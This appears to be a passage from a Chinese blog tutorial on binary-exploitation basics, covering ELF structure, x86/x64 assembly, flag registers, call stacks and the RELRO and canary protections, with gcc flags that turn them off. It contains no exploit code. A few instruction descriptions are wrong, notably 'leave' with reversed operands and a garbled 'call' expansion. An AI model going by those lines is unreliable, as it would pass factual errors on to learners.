<h3 id="ELF文件结构"><a href="#ELF文件结构" class="headerlink" title="ELF文件结构"></a>ELF文件结构</h3><p><a class="link"   href="https://www.man7.org/linux/man-pages/man5/elf.5.html" >源码网址 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/ELF.png"
                      alt="ELF"
                ></p>
<p><strong>ELF分类</strong></p>
<ul>
<li><code>ET_NONE</code>：未知类型。这个标记表明文件类型不确定，或者还未定义。</li>
<li><code>ET_REL</code>：重定位文件。ELF 类型标记为 <code>relocatable</code> 意味着该文件 被标记为了一段可重定位的代码，有时也称为目标文件。可重定位 目标文件通常是还未被链接到可执行程序的一段位置独立的代码 （position independent code）。在编译完代码之后通常可以看到一 个.o 格式的文件，这种文件包含了创建可执行文件所需要的代码 和数据。</li>
<li><code>ET_EXEC</code>：可执行文件。ELF 类型为 <code>executable</code>，表明这个文件被标 记为可执行文件。这种类型的文件也称为程序，是一个进程开始执 行的入口。</li>
<li><code>ET_DYN</code>：共享目标文件。ELF 类型为 <code>dynamic</code>，意味着该文件被标记 为了一个动态的可链接的目标文件，也称为共享库。这类共享库会在 程序运行时被装载并链接到程序的进程镜像中。</li>
<li><code>ET_CORE</code>：核心文件。在程序崩溃或者进程传递了一个 <code>SIGSEGV</code> 信号（分段违规）时，会在核心文件中记录整个进程的镜像信息。可以使用 <code>GDB</code> 读取这类文件来辅助调试并查找程序崩溃的原因。</li>
</ul>
<p><strong>ELF头部</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">ELF <span class="title">header</span> <span class="params">(Ehdr)</span></span></span><br><span class="line"><span class="function"><span class="meta">#<span class="keyword">define</span> EI_NIDENT 16</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="keyword">struct</span> </span>&#123;    </span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> e_ident[EI_NIDENT];	<span class="comment">/* 幻数以及其他信息*/</span>   </span><br><span class="line">	<span class="type">uint16_t</span> e_type;					<span class="comment">/* 对象文件类型*/</span>   </span><br><span class="line">	<span class="type">uint16_t</span> e_machine;					<span class="comment">/* 架构*/</span>  </span><br><span class="line">	<span class="type">uint32_t</span> e_version;					<span class="comment">/* 对象文件版本*/</span>  </span><br><span class="line">    ElfN_Addr e_entry;					<span class="comment">/* 程序入口的虚拟地址*/</span>    </span><br><span class="line">	ElfN_Off e_phoff;					<span class="comment">/* 程序头表的偏移量（按字节计算）*/</span>  </span><br><span class="line">	ElfN_Off e_shoff;					<span class="comment">/* 节头表的偏移量（按字节计算）*/</span>  </span><br><span class="line">	<span class="type">uint32_t</span> e_flags;					<span class="comment">/* 保存与文件相关的、特定于处理器的标 志。标志名称采用EF_machine_flag的格式*/</span></span><br><span class="line">	<span class="type">uint16_t</span> e_ehsize;					<span class="comment">/* ELF头部的大小（按字节计算） */</span>  </span><br><span class="line">	<span class="type">uint16_t</span> e_phentsize;				<span class="comment">/* 程序头表的条目大小（按字节计算） */</span></span><br><span class="line">	<span class="type">uint16_t</span> e_phnum;					<span class="comment">/* 程序头表的条目数，可以为0 */</span>    </span><br><span class="line">	<span class="type">uint16_t</span> e_shentsize;				<span class="comment">/* 节头表的条目大小（按字节计算） */</span>    </span><br><span class="line">	<span class="type">uint16_t</span> e_shnum;					<span class="comment">/* 节头表的条目数，可以为0 */</span>    </span><br><span class="line">	<span class="type">uint16_t</span> e_shstrndx;<span class="comment">/* 节头表中与节名称字符串表相关的条目的 索引。如果文件没有节名称字符串表，此参数可以为SHN_UNDEF */</span> </span><br><span class="line">&#125; ElfN_Ehdr; </span><br></pre></td></tr></table></figure></div>

<p><strong>ELF程序头</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Program <span class="title">header</span> <span class="params">(Phdr)</span><span class="keyword">typedef</span> <span class="keyword">struct</span> </span>&#123;  </span><br><span class="line">	<span class="type">uint32_t</span> p_type;	<span class="comment">/*segment type*/</span>  </span><br><span class="line">	Elf32_Off p_offset;	<span class="comment">/*segment offset*/</span>   </span><br><span class="line">	Elf32_Addr p_vaddr;	<span class="comment">/*segment virtual addr*/</span>    </span><br><span class="line">	Elf32_Addr p_paddr;	<span class="comment">/*segment physical addr*/</span>   </span><br><span class="line">	<span class="type">uint32_t</span> p_filesz;	<span class="comment">/*size of segment in the file*/</span>    </span><br><span class="line">	<span class="type">uint32_t</span> p_memsz;	<span class="comment">/*size of segment in the memory*/</span>    </span><br><span class="line">	<span class="type">uint32_t</span> p_flags;	<span class="comment">/*segment flag : R|W|X*/</span>    </span><br><span class="line">	<span class="type">uint32_t</span> p_align;	<span class="comment">/*segment alignment in memory*/</span></span><br><span class="line">&#125; Elf32_Phdr;</span><br><span class="line"><span class="comment">/*FOR 64Bit, p_flags is in total struct*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;	    </span><br><span class="line">	<span class="type">uint32_t</span> p_type;	    </span><br><span class="line">	<span class="type">uint32_t</span> p_flags;    </span><br><span class="line">	Elf64_Off p_offset;    </span><br><span class="line">	Elf64_Addr p_vaddr;    </span><br><span class="line">	Elf64_Addr p_paddr;    </span><br><span class="line">	<span class="type">uint64_t</span> p_filesz;    </span><br><span class="line">	<span class="type">uint64_t</span> p_memsz;    </span><br><span class="line">	<span class="type">uint64_t</span> p_align;</span><br><span class="line">&#125; Elf64_Phdr; </span><br></pre></td></tr></table></figure></div>

<p><strong>ELF节头</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Section <span class="title">header</span> <span class="params">(Shdr)</span>    </span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="keyword">struct</span> </span>&#123;    </span><br><span class="line">	<span class="type">uint32_t</span> sh_name;	<span class="comment">// offset into shdr string table for shdr name	    </span></span><br><span class="line">	<span class="type">uint32_t</span> sh_type;	<span class="comment">// shdr type I.E SHT_PROGBITS    </span></span><br><span class="line">	<span class="type">uint32_t</span> sh_flags;	<span class="comment">// shdr flags I.E SHT_WRITE|SHT_ALLOC     </span></span><br><span class="line">	Elf32_Addr sh_addr;	<span class="comment">// address of where section begins    </span></span><br><span class="line">	Elf32_Off sh_offset;	<span class="comment">// offset of shdr from beginning of file    </span></span><br><span class="line">	<span class="type">uint32_t</span> sh_size;	<span class="comment">// size that section takes up on disk    </span></span><br><span class="line">	<span class="type">uint32_t</span> sh_link;	<span class="comment">// points to another section    </span></span><br><span class="line">	<span class="type">uint32_t</span> sh_info;	<span class="comment">// interpretation depends on section type    </span></span><br><span class="line">	<span class="type">uint32_t</span> sh_addralign;	<span class="comment">// alignment for address of section     </span></span><br><span class="line">	<span class="type">uint32_t</span> sh_entsize;	<span class="comment">// size of each certain entries that may be in </span></span><br><span class="line">&#125; Elf32_Shdr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;    </span><br><span class="line">	<span class="type">uint32_t</span> sh_name;	/ * <span class="function">Section <span class="title">name</span> <span class="params">(string tbl index)</span> */    </span></span><br><span class="line"><span class="function">	<span class="type">uint32_t</span> sh_type</span>;	/ * Section type */    </span><br><span class="line">	<span class="type">uint64_t</span> sh_flags;	/ * Section flags */    </span><br><span class="line">	Elf64_Addr sh_addr;	/ * Section <span class="keyword">virtual</span> addr at execution */    </span><br><span class="line">	Elf64_Off sh_offset;	/ * Section file offset */   </span><br><span class="line">	<span class="type">uint64_t</span> sh_size;	/ * Section size in bytes */    </span><br><span class="line">	<span class="type">uint32_t</span> sh_link;	/ * Link to another section */    </span><br><span class="line">	<span class="type">uint32_t</span> sh_info;	/ * Additional section information */   </span><br><span class="line">	<span class="type">uint64_t</span> sh_addralign;	/ * Section alignment */    </span><br><span class="line">	<span class="type">uint64_t</span> sh_entsize;	/ * Entry size <span class="keyword">if</span> section holds table */</span><br><span class="line">&#125; Elf64_Shdr; </span><br></pre></td></tr></table></figure></div>

<p><strong>ELF重要节</strong></p>
<ul>
<li><code>.init</code> 节和 <code>.fini</code> 节。</li>
<li><code>.text</code> 节。</li>
<li><code>.bss</code> 节, <code>.data</code> 节, <code>.rodata</code> 节。</li>
<li>延迟绑定 <code>.plt</code>, <code>.got</code>, <code>.got.plt</code>。</li>
<li><code>.rel.*</code>, <code>.rela.*</code> 节。</li>
<li><code>.dynamic</code> 节。</li>
<li><code>.init_array</code> 和 <code>.fini_array</code>。</li>
<li><code>.shstrtab</code>, <code>.symtab</code>, <code>.strtab</code>, <code>.dynsym</code>,  <code>.hash</code> 及 <code>.dynstr</code>节。</li>
<li><code>.ctors</code> 和 <code>.dtors</code> 节 。</li>
</ul>
<h3 id="符号和剥离的二进制文件"><a href="#符号和剥离的二进制文件" class="headerlink" title="符号和剥离的二进制文件"></a>符号和剥离的二进制文件</h3><p>高级源代码（如C代码）均以有意义的、人类可读的函数和变量命名为中心。编译程序时，编译器会翻译符号，这些符号会跟踪其名称，并记录哪些二进制代码和数据对应哪个符号。如函数符号提供符 号从高级函数名称到第一个地址和每个函数的大小的映射。链接器在组合对象文件时通常使用此信息，例如，使用此信息来解析模块之间的函数和变量引用，并且帮助调试。</p>
<p>可以使用命令查看二进制文件的符合信息。</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">readelf --syms a.out</span><br></pre></td></tr></table></figure></div>

<p><code>GCC</code> 的默认行为是不自动剥离新编译 的二进制文件。如果你想知道带符号的二进制文件最终是如何被剥离 的，可以使用 <code>strip</code> 命令。</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">strip --strip-all a.out</span><br></pre></td></tr></table></figure></div>

<h3 id="二进制文件的加载"><a href="#二进制文件的加载" class="headerlink" title="二进制文件的加载"></a>二进制文件的加载</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/12/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Base_knowledge/image-20231109145853764.png"
                      alt="image-20231109145853764"
                ></p>
<ul>
<li>创建一个进程，包含虚拟地址空间。</li>
<li>将解释器映射到进程的虚拟内存中，它用于加载二进制文件并执行必要的重定位操作，一般名字为 <code>ld-linux.so</code>。解释器加载后内核将控制权交给解释器，解释器会在用户空间工作。</li>
<li>解释器解析并找出二进制文件使用的动态库，并将其映射到虚拟地址空间，然后在代码节执行所有必要的重定位。</li>
</ul>
<h3 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h3><p>二进制文件加载到进程中执行的时候动态链接器执行了最后的重定位。例如在编译时由于不知道加载地址，因此它会解析共享库中函数的引用。这里需要简单介绍一下，实际上在加载二进制文件的时候许多重定位一般都不会立即完成，而是延迟到对未解析位置进行首次引用之前，这就是延迟绑定。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/12/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Base_knowledge/plt.got.png"
                      alt="plt.got"
                ></p>
<h2 id="推荐书籍"><a href="#推荐书籍" class="headerlink" title="推荐书籍"></a>推荐书籍</h2><p>《二进制分析实战》</p>
<p>《Linux二进制分析》</p>
<h1 id="汇编语言基础"><a href="#汇编语言基础" class="headerlink" title="汇编语言基础"></a>汇编语言基础</h1><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p><code>x32</code> 寄存器：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/12/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Base_knowledge/x32reg.jpg"
                      alt="x32reg"
                ></p>
<p><code>x64</code> 寄存器：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/12/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Base_knowledge/x64reg.png"
                      alt="x64reg"
                ></p>
<h2 id="常见汇编指令"><a href="#常见汇编指令" class="headerlink" title="常见汇编指令"></a>常见汇编指令</h2><p><strong>mov 操作数，源操作数</strong></p>
<p><code>mov</code> 指令将第二个操作数（可以是寄存器的内容、内存中的内容或值）复制到第一个操作数（寄存器或内存）。mov不能用于直接从内存复制到内存</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov &lt;reg&gt;,&lt;reg&gt;  	; mov rax, rbx</span><br><span class="line">mov &lt;reg&gt;,&lt;mem&gt;		; mov rax, [rbc] ; mov edx, [esi+4*ebx + 0x8]   </span><br><span class="line">mov &lt;mem&gt;,&lt;reg&gt;		; mov [rax], rbx</span><br><span class="line">mov &lt;reg&gt;,&lt;const&gt;	; mov rax, 0x8</span><br><span class="line">mov &lt;mem&gt;,&lt;const&gt;	; mov [rax], 0xff</span><br></pre></td></tr></table></figure></div>

<p><strong>push 操作数</strong></p>
<p><code>push</code> 指令将操作数压入内存的栈中，并且<code>rsp - 8 / esp - 4</code>。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">push &lt;reg&gt;			; push rax</span><br><span class="line">push &lt;mem&gt;			; push [rdx]</span><br><span class="line">push &lt;con&gt;			; push 0xff</span><br></pre></td></tr></table></figure></div>

<p><strong>pop 操作数</strong></p>
<p><code>pop</code> 指令与 <code>push</code> 指令相反，它执行的是出栈的工作，并且 <code>rsp + 8 / esp + 4</code>。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop &lt;reg&gt;			; pop rax</span><br><span class="line">pop &lt;mem&gt;			; pop [rdi]</span><br></pre></td></tr></table></figure></div>

<p><strong>lea 操作数，源操作数</strong></p>
<p><code>lea</code> 实际上是一个载入有效地址指令，将第二个操作数表示的地址载入到第一个操作数（寄存器）中。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea &lt;reg&gt;,&lt;mem&gt;		; lea edi, [ebx+4*esi] </span><br></pre></td></tr></table></figure></div>

<p><strong>add 操作数，源操作数</strong></p>
<p><code>add</code> 指令将两个操作数相加，且将相加后的结果保存到第一个操作数中。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">add &lt;reg&gt;,&lt;reg&gt;		;</span><br><span class="line">add &lt;reg&gt;,&lt;mem&gt;		;</span><br><span class="line">add &lt;mem&gt;,&lt;reg&gt;		;</span><br><span class="line">add &lt;reg&gt;,&lt;con&gt;		;</span><br><span class="line">add &lt;mem&gt;,&lt;con&gt;		;</span><br></pre></td></tr></table></figure></div>

<p><strong>sub 操作数，源操作数</strong></p>
<p><code>sub</code>指令指示第一个操作数减去第二个操作数，并将相减后的值保存在第一个操作数，</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sub &lt;reg&gt;,&lt;reg&gt;		;</span><br><span class="line">sub &lt;reg&gt;,&lt;mem&gt;		;</span><br><span class="line">sub &lt;mem&gt;,&lt;reg&gt;		;</span><br><span class="line">sub &lt;reg&gt;,&lt;con&gt;		;</span><br><span class="line">sub &lt;mem&gt;,&lt;con&gt;		;</span><br></pre></td></tr></table></figure></div>

<p><strong>inc 操作数 &amp;&amp; dec 操作数</strong></p>
<p><code>inc</code>，<code>dec</code> 分别表示将操作数自加1，自减1，</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">inc &lt;reg&gt;			;</span><br><span class="line">inc &lt;mem&gt;			;</span><br><span class="line">dec &lt;reg&gt;			;</span><br><span class="line">dec &lt;mem&gt;			;</span><br></pre></td></tr></table></figure></div>

<p><strong>imul</strong></p>
<p>整数相乘指令，它有两种指令格式，一种为两个操作数，将两个操作数的值相乘，并将结果保存在第一个操作数中，第一个操作数必须为寄存器；第二种格式为三个操作数，其语义为：将第二个和第三个操作数相乘，并将结果保存在第一个操作数中，第一个操作数必须为寄存器。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">imul &lt;reg&gt;,&lt;reg&gt;		; imul rax, rbx ==&gt; rax = rax * rbx</span><br><span class="line">imul &lt;reg&gt;,&lt;mem&gt;		;</span><br><span class="line">imul &lt;reg&gt;,&lt;reg&gt;,&lt;con&gt;	; imul rax, rbx, 0x10 ==&gt; rax = rbx * 0x10</span><br><span class="line">imul &lt;reg&gt;,&lt;mem&gt;,&lt;con&gt;	;</span><br></pre></td></tr></table></figure></div>

<p><strong>and 操作数，源操作数, or 操作数，源操作数, xor 操作数，源操作数</strong></p>
<p>逻辑与、逻辑或、逻辑异或操作指令，用于操作数的位操作，操作结果放在第一个操作数中。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">and &lt;reg&gt;,&lt;reg&gt;</span><br><span class="line">and &lt;reg&gt;,&lt;mem&gt;</span><br><span class="line">and &lt;mem&gt;,&lt;reg&gt;</span><br><span class="line">and &lt;reg&gt;,&lt;con&gt;</span><br><span class="line">and &lt;mem&gt;,&lt;con&gt;</span><br><span class="line"></span><br><span class="line">or &lt;reg&gt;,&lt;reg&gt;</span><br><span class="line">or &lt;reg&gt;,&lt;mem&gt;</span><br><span class="line">or &lt;mem&gt;,&lt;reg&gt;</span><br><span class="line">or &lt;reg&gt;,&lt;con&gt;</span><br><span class="line">or &lt;mem&gt;,&lt;con&gt;</span><br><span class="line"></span><br><span class="line">xor &lt;reg&gt;,&lt;reg&gt;</span><br><span class="line">xor &lt;reg&gt;,&lt;mem&gt;</span><br><span class="line">xor &lt;mem&gt;,&lt;reg&gt;</span><br><span class="line">xor &lt;reg&gt;,&lt;con&gt;</span><br><span class="line">xor &lt;mem&gt;,&lt;con&gt;</span><br></pre></td></tr></table></figure></div>

<p><strong>not</strong></p>
<p>位翻转指令，将操作数中的每一位翻转，即0-&gt;1, 1-&gt;0。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">not &lt;reg&gt;</span><br><span class="line">not &lt;mem&gt;</span><br></pre></td></tr></table></figure></div>

<p><strong>neg</strong></p>
<p>取负指令。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">neg &lt;reg&gt;</span><br><span class="line">neg &lt;mem&gt;</span><br></pre></td></tr></table></figure></div>

<p><strong>SHL、SHR、SAL、SAR: 移位指令</strong></p>
<p>算数移位考虑符号，逻辑移位不考虑。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">;SHL(Shift Left):             ;逻辑左移</span><br><span class="line">;SHR(Shift Right):            ;逻辑右移</span><br><span class="line">;SAL(Shift Arithmetic Left):  ;算术左移</span><br><span class="line">;SAR(Shift Arithmetic Right): ;算术右移</span><br><span class="line"></span><br><span class="line">;其中的 SHL 和 SAL 相同, 但 SHR 和 SAR 不同.</span><br><span class="line"></span><br><span class="line">;SHL, SAL: 每位左移, 低位补 0,  高位进 CF</span><br><span class="line">;SHR     : 每位右移, 低位进 CF, 高位补 0</span><br><span class="line">;SAR     : 每位右移, 低位进 CF, 高位不变</span><br><span class="line">;它们的结果影响 OF、SF、ZF、PF、CF</span><br><span class="line">;它们的指令格式相同:</span><br><span class="line">SHL/SHR/SAL/SAR &lt;reg&gt;, &lt;con8&gt;</span><br><span class="line">SHL/SHR/SAL/SAR &lt;mem&gt;, &lt;con8&gt;</span><br><span class="line">SHL/SHR/SAL/SAR &lt;reg&gt;, CL</span><br><span class="line">SHL/SHR/SAL/SAR &lt;mem&gt;, CL</span><br></pre></td></tr></table></figure></div>

<p><strong>ROL、ROR、RCL、RCR: 循环移位指令</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">;ROL(Rotate Left):                循环左移</span><br><span class="line">;ROR(Rotate Right):               循环右移</span><br><span class="line">;RCL(Rotate through Carry Left):  带进位循环左移</span><br><span class="line">;RCR(Rotate through Carry Right): 带进位循环右移</span><br><span class="line"></span><br><span class="line">;ROL: 循环左移, 高位到低位并送 CF</span><br><span class="line">;ROR: 循环右移, 低位到高位并送 CF</span><br><span class="line">;RCL: 循环左移, 进位值(原CF)到低位, 高位进 CF</span><br><span class="line">;RCR: 循环右移, 进位值(原CF)到高位, 低位进 CF</span><br><span class="line"></span><br><span class="line">;它们的结果影响 OF、CF</span><br><span class="line">;它们的指令格式相同:</span><br><span class="line">ROL/ROR/RCL/RCR &lt;reg&gt;, &lt;con8&gt;</span><br><span class="line">ROL/ROR/RCL/RCR &lt;mem&gt;, &lt;con8&gt;</span><br><span class="line">ROL/ROR/RCL/RCR &lt;reg&gt;, CL</span><br><span class="line">ROL/ROR/RCL/RCR &lt;mem&gt;, CL</span><br></pre></td></tr></table></figure></div>

<p><strong>jmp 操作数</strong></p>
<p>控制转移到<code>label</code>所指示的地址。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">jump label</span><br></pre></td></tr></table></figure></div>

<p><strong>leave</strong></p>
<p><code>leave</code> 指令等同于两条指令 <code>mov rbp, rsp; pop rbp</code></p>
<p><strong>ret</strong></p>
<p><code>ret</code> 指令等同于 <code>pop rip</code>。</p>
<p><strong>call 操作数</strong></p>
<p><code>call</code> 操作数 <code>call</code> 指令首先将当前执行指令地址入栈，然后无条件转移到由标签指示的指令。与其它简单的跳转指令不同，<code>call</code> 指令保存调用之前的地址信息（当 <code>call</code> 指令结束后，返回到调用之前的地址）。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">call label		; call label ==&gt; push rdi + 8; jump label; ... ; ret;</span><br></pre></td></tr></table></figure></div>

<h2 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h2><h3 id="状态标志"><a href="#状态标志" class="headerlink" title="状态标志"></a>状态标志</h3><p>状态标志用于指示算术运算（例如使用<code>ADD</code>、<code>SUB</code>、<code>MUL</code>、<code>DIV</code>等指令）后的结果，它们包括包括有以下几个标志：</p>
<ul>
<li><code>CF</code>：进位标志（Carry flag）是标志寄存器的第0位，又被称之为<code>CY</code>，当其被设置时表示运算结果的最高有效位发生进位或借位的情况，并在无符号整数的运算中表示运算的溢出状态。</li>
<li><code>PF</code>：奇偶校验标志（Parity flag）是标志寄存器的第2位，当其被设置表示结果中包含偶数个值为1的位，否则表示结果中包含奇数个值为1的位。</li>
<li><code>AF</code>：辅助进位标志（Auxiliary carry flag）是标志寄存器的第4位，当其被设置表示在算术运算中低三位发生进位或借位（例如<code>AL</code>向<code>AH</code>进位或借位）或BCD码算术运算中发生进位或借位的情况。</li>
<li><code>ZF</code>：零标志（Zero flag）是标志寄存器的第6位，当其被设置时运算的结果是否等于0，否则不等于0。</li>
<li><code>SF</code>：符号标志（Sign flag）是标志寄存器的第7位，当其被设置时表示结果为负数，否则为正数。</li>
<li><code>OF</code>：溢出标志（Overflow flag）是标志寄存器的第11位，当其被设置时代表运算结果溢出，即结果超出了能表达的最大范围。</li>
</ul>
<p>状态标志中，只有<code>CF</code>标志能被直接通过<code>STC</code>、<code>CLC</code>以及<code>CMC</code>指令修改。</p>
<h3 id="控制标志"><a href="#控制标志" class="headerlink" title="控制标志"></a>控制标志</h3><ul>
<li><code>DF</code>：方向标志（Direction flag）是标志寄存器的第10位，用于指示串操作指令地址的变化方向。当其被设置时，存储器由自高向低方向变化，否则相反。<code>STD</code>与<code>CLD</code>指令分别用于设置、清除<code>DF</code>标志的值。</li>
</ul>
<h3 id="系统标志"><a href="#系统标志" class="headerlink" title="系统标志"></a>系统标志</h3><ul>
<li><code>TF</code>：陷阱标志（Trap flag）是标志寄存器的第8位，当其被设置时将开启单步调试模式。在其被设置的情况下，每个指令被执行后都将产生一个调试异常，以便于观察指令执行后的情况。</li>
<li><code>IF</code>：中断标志（Interrupt flag）是标志寄存器的第9位，当其被设置时表示CPU可响应可屏蔽中断（maskable interrupt）。</li>
<li><code>IOPL</code>：I&#x2F;O特权级别标志（I&#x2F;O privilege level  flag）是标志寄存器的第12位以及第13位，表示当其程序或任务的I&#x2F;O权限级别。I&#x2F;O权限级别为0～3范围之间的值，通常一般用户程序I&#x2F;O特权级别为0。当前运行程序的CPL（current privilege level）必须小于等于IOPL，否则将发生异常。</li>
<li><code>NT</code>：嵌套任务（Nested task flag）是标志寄存器的第14位，用于控制中断返回指令<code>IRET</code>的执行方式。若被设置则将通过中断的方式执行返回，否则通过常规的堆栈的方式执行。在执行<code>CALL</code>指令、中断或异常处理时，处理器将会设置该标志。</li>
<li><code>RF</code>：恢复标志（Resume flag）是标志寄存器的第16位，用于控制处理器对调试异常的响应。若其被设置则会暂时禁止断点指令产生的调试异常，其复位后断点指令将会产生异常。</li>
<li><code>VM</code>：虚拟8086模式标志（Virtual 8086 mode flag）是标志寄存器的第17位，当其被设置表示启用虚拟8086模式（在保护模式下模拟实模式），否则退回到保护模式工作。</li>
<li><code>AC</code>：对齐检查标志（Alignment check (or access control) flag）是标志寄存器的第18位。当该标志位被设置且<code>CR0</code>寄存器中的<code>AM</code>位被设置时，将对用户态下对内存引用进行对齐检查，在存在未对齐的操作数时产生异常。</li>
<li><code>VIF</code>：虚拟中断标志（Virtual interrupt flag）是标志寄存器的第19位，为<code>IF</code>标志的虚拟映象。该标志与<code>VIP</code>标志一起，且在<code>CR4</code>寄存器中<code>VME</code>或<code>PVI</code>位被设置且<code>IOPL</code>小于3时，处理器才将识别该标志。</li>
<li><code>VIP</code>：虚拟中断挂起标志（Virtual interrupt pending flag）是标志寄存器的第20位，其被设置表示有一个中断被挂起（等待处理），否则表示没有等待处理的中断。该标志通常与<code>VIF</code>标志搭配一起使用。</li>
<li><code>ID</code>：ID标志（Identification flag）是标志寄存器的第21位，通过修改该位的值可以测试是否支持<code>CPUID</code>指令。</li>
</ul>
<h1 id="函数调用栈及ELF相关安全机制"><a href="#函数调用栈及ELF相关安全机制" class="headerlink" title="函数调用栈及ELF相关安全机制"></a>函数调用栈及ELF相关安全机制</h1><h2 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h2><p><strong>x32 函数调用栈：</strong></p>
<p>函数通过栈传参，参数从右到左依次入栈。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/12/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Base_knowledge/x32stack.png"
                      alt="x32stack"
                ></p>
<p><strong>x64 函数调用栈：</strong></p>
<p>参数前六个参数从左到右分别为<code>rdi, rsi, rdx, rcx, r8, r9</code>。超过六个参数，多余参数通过栈传参。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/12/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Base_knowledge/x64stack.png"
                      alt="x64stack"
                ></p>
<h2 id="ELF相关安全机制"><a href="#ELF相关安全机制" class="headerlink" title="ELF相关安全机制"></a>ELF相关安全机制</h2><p><strong>RELRO</strong></p>
<ul>
<li>简介</li>
</ul>
<p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对 <code>GOT（Global Offset Table）</code>攻击。<code>RELRO</code> 为”<code>Partial RELRO</code>，说明我们对 <code>GOT</code> 表具有写权限。</p>
<ul>
<li>开启方式：</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c						// 默认情况下，是Partial RELRO</span><br><span class="line">gcc -z norelro -o test test.c			// 关闭，即No RELRO</span><br><span class="line">gcc -z lazy -o test test.c				// 部分开启，即Partial RELRO 重定位表格只读，重定位项可读写</span><br><span class="line">gcc -z now -o test test.c				// 全部开启，重定位表格和重定位项均为只读</span><br></pre></td></tr></table></figure></div>

<p><strong>Canary</strong></p>
<ul>
<li>简介</li>
</ul>
<p>函数开始执行的时候会先往栈里插入<code>cookie</code>信息，当函数真正返回的时候会验证 <code>cookie</code> 信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将 <code>cookie</code> 信息给覆盖掉，导致栈保护检查失败而阻止 <code>shellcode</code> 的执行。在 <code>Linux</code> 中我们将<code>cookie</code> 信息称为 <code>canary</code>。</p>
<ul>
<li>开启方式：</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c						// 默认情况下，不开启Canary保护</span><br><span class="line">gcc -fno-stack-protector -o test test.c  //禁用栈保护</span><br><span class="line">gcc -fstack-protector -o test test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure></div>

<p><strong>NX</strong></p>
<ul>
<li>简介</li>
</ul>
